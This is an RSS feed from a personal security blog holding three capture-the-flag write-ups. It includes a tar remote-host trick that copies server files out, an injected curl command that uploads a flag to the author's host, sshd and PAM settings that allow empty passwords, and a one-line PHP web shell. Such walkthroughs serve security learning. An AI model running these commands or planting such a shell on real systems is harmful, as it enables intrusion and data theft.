<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on Robin Verton</title>
    <link>http://robinverton.de/ctf/index.xml</link>
    <description>Recent content in Ctf on Robin Verton</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>de-de</language>
    <lastBuildDate>Sun, 26 Mar 2017 13:15:12 +0200</lastBuildDate>
    <atom:link href="http://robinverton.de/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>ASIS CTF 2017, Tar Bomb, Web129</title>
      <link>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</link>
      <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
      
      <guid>http://robinverton.de/ctf/asisctf-2017-tar-bomb-web129/</guid>
      <description>

&lt;p&gt;This was not a typical web challenge, apart from beeing accessible over the web. The aim was to successfully execute a tar command (and do something usefull with it). The returned code of executed tar command was then returned to the user. I always got a &amp;ldquo;tar returned 2&amp;rdquo;, meaning that the file I was trying to (un)tar was not found. Chars to travers or inject were all filtered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I tried different techniques of command injection, but had not success with this. So I dug into the man pages of tar and found this nice little thing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;     --force-local
           archive file is local even if it has a colon
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This brought me onto the track that there may be a way to define a remote (tape) device to (un)tar from and to. And yeah, I was &lt;a href=&#34;ftp://ftp.gnu.org/old-gnu/Manuals/tar/html_node/tar_127.html&#34;&gt;right&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;If the file name contains a `:&#39;, it is interpreted as `hostname:file name&#39;. If the hostname contains an at sign (@), it is treated as `user@hostname:file name&#39;. In either case, tar will invoke the command rsh (or remsh) to start up an `/etc/rmt&#39; on the remote machine.

If you give an alternate login name, it will be given to the rsh. Naturally, the remote machine must have an executable `/etc/rmt&#39;. This program is free software from the University of California, and a copy of the source code
can be found with the sources for tar; it&#39;s compiled and installed by default.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, so let&amp;rsquo;s try it. To verify this, I passed &lt;code&gt;tar tvf foo@unlink.io:foobar.tar&lt;/code&gt; and watched the auth.log on my server. And yeah, there was a failed connection attempt.&lt;/p&gt;

&lt;h3 id=&#34;allowing-remote-access&#34;&gt;Allowing remote access&lt;/h3&gt;

&lt;p&gt;The next step was allowing the remote server to log in. This took me longer than I thought, because setting up an insecure sshd is hard. I created a user with no password (&lt;code&gt;passwd -d username&lt;/code&gt;) and allowed login with an (empty) password in my sshd_config:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;PermitEmptyPasswords no
PasswordAuthentication yes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But I was still not able to login via an empty password over ssh. Why? After searching for a long time I came around this &lt;a href=&#34;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=93200&amp;amp;repeatmerged=yes&#34;&gt;debian bug report&lt;/a&gt;. The TLDR of it: &lt;code&gt;ssh&lt;/code&gt; is not a secure tty, so you have to tell &lt;code&gt;pam.d&lt;/code&gt; that it is okay to pass an empty password (replace &lt;em&gt;nullok_securer&lt;/em&gt; with &lt;em&gt;nullok&lt;/em&gt; in &lt;em&gt;/etc/pam.d/common-auth&lt;/em&gt;).&lt;/p&gt;

&lt;h3 id=&#34;getting-all-files&#34;&gt;Getting all files&lt;/h3&gt;

&lt;p&gt;So I felt I was near the finish. I prepared the sshd and build a command to tar me every file from the remote server and place the .tar on my server:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar cf pwn@myserver:foo.tar *
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Got it! But where is the flag? .. So as you can see, this was still not the end.&lt;/p&gt;

&lt;h3 id=&#34;the-real-web-challenge&#34;&gt;The real web challenge&lt;/h3&gt;

&lt;p&gt;After inspecting the PHP files, this was the basic functionality of them:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;admin_console.php&lt;/strong&gt;
After checking existence of a cookie and a proof of work (MD5 brute), send a URL to a phantomjs script.
&lt;script src=&#34;//gist.github.com/rverton/248a03afb0f7f5451fa253feb8a3b440.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;readflag.php&lt;/strong&gt;: If REMOTE_ADDR is localhost, open /flag and print it.
&lt;script src=&#34;//gist.github.com/rverton/7f94b907a39ec2e063f843bdd80dc754.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Note: I will not go into the detail of the substr(md5(str), 0, 6) proof of work here.&lt;/p&gt;

&lt;p&gt;So the plan was to use the worker.js script to extract the flag. But it was not printed out, so what can we do here? If we look closely at the regex for the URL, we see that there is no end specified, thus allowing us to inject commands after a valid url.&lt;/p&gt;

&lt;p&gt;Lets try to pass the output of the worker.js script to us via curl (nc was not available):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;All right, still no flag. So screw this worker.js, let&amp;rsquo;s do it all by ourself instead:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;https://127.0.0.1&#39; | curl http://127.0.0.1/readflag.php &amp;gt; /tmp/foo &amp;amp;&amp;amp; curl -F &amp;quot;foo=@/tmp/foo&amp;quot; http://unlink.io:31337/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/ctf/asis2017-web129-6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>VolgaCTF, web200 (Share Point)</title>
      <link>http://robinverton.de/ctf/volgactf-web200-sharepoint/</link>
      <pubDate>Sun, 26 Mar 2017 13:15:12 +0200</pubDate>
      
      <guid>http://robinverton.de/ctf/volgactf-web200-sharepoint/</guid>
      <description>

&lt;p&gt;The only accessible page for Share Point was a login form. After fiddling with the login, I noticed that you were able to
login with some basic credentials like &lt;code&gt;admin1111:password&lt;/code&gt; or &lt;code&gt;admin11111:password&lt;/code&gt;. In the member area we had three possibilities:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Upload a file&lt;/li&gt;
&lt;li&gt;View Files&lt;/li&gt;
&lt;li&gt;Shared Files&lt;/li&gt;
&lt;li&gt;Logout&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Firt I tried to upload some .php files, which did not work (only some extensions like .jpg or .txt were allowed). After you have uploaded a file, you were able to share this file with a second user. This user could &amp;ldquo;accept&amp;rdquo; this file, which was then moved to the second users&amp;rsquo; folder. This is also where I found the first vulnerability. When accepting a shared file, it was possible to modify the filename parameter and upload any file you want from the underlying system. I tried to find the flag with this, but my guesswork was not successfull.&lt;/p&gt;

&lt;h2 id=&#34;adding-a-php-handler-for-text-files&#34;&gt;Adding a PHP handler for text files&lt;/h2&gt;

&lt;p&gt;Next I moved PHP files from the application itself into my folder (&lt;code&gt;/files/&amp;lt;username&amp;gt;/&amp;lt;filename&amp;gt;&lt;/code&gt;), but they were resulting in &lt;code&gt;500 Internal Server Errors&lt;/code&gt;. I then had the idea to upload a .htaccess file and enable the PHP interpreter for a file extension I was allowed to upload (for example a .txt file). This surprisingly worked! I created the following .htaccess file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After uploading this, I also submtited a foo.txt file with the following content:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Voil√¢, we got a remote command executing:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/sharepoint2_small.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The flag was found under &lt;code&gt;/opt/flag.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;VolgaCTF{AnoTHer_apPro0ch_to_file_Upl0Ad_with_PhP}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>nullcon 2017, pwn200</title>
      <link>http://robinverton.de/ctf/nullcon17-pwn200/</link>
      <pubDate>Sun, 12 Feb 2017 13:48:18 +0200</pubDate>
      
      <guid>http://robinverton.de/ctf/nullcon17-pwn200/</guid>
      <description>&lt;p&gt;Exploitation was straight forward by abusing a format string vulnerability to overwrite .got. The &lt;code&gt;strchr&lt;/code&gt; was called immediately after the printf call with our passed string as an argument, so it was only needed to overwrite this with the address of &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;script src=&#34;//gist.github.com/rverton/5164f9ffa7ff5cadbe130ea9ac24d42a.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
  </channel>
</rss>